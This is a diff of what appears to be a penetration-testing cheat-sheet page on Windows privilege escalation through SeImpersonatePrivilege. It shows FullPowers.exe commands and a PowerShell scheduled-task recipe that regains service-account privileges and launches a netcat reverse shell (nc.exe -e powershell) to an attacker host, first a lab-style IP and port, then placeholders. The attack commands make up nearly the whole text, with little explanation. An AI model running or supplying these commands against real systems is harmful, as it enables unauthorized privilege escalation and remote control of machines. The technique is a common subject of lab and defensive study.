@@ -4,18 +4,17 @@ date: 2024-8-2
 tags: ["SeImpresonate", "Windows", "potato", "privesc", "fullpower"]
 ---
 
----
 ### Abuse #1: Recover SeImpresonate
 
 <div>
 
-```powershell
+```console
 .\FullPowers.exe -c "whoami /priv"
 ```
 
-```powershell
+```console
 # Revshell
-.\FullPowers.exe -c "<powershell #3 Base64>"
+.\FullPowers.exe -c "<POWERSHELL_3_BASE64>"
 ```
 
 </div>
@@ -26,27 +25,27 @@ tags: ["SeImpresonate", "Windows", "potato", "privesc", "fullpower"]
 
 <div>
 
-```powershell
+```console
 # Create a list of privileges 
 [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"
 ```
 
-```powershell
+```console
 # Create a Principal for the task 
 $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs
 ```
 
-```powershell
+```console
 # Create an action for the task 
-$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell 10.10.14.10 1337`""
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell <LOCAL_IP> <LOCAL_PORT>`""
 ```
 
-```powershell
+```console
 # Create the task
 Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $TaskPrincipal
 ```
 
-```powershell
+```console
 # Start the task
 Start-ScheduledTask -TaskName "SomeTask"
 ```
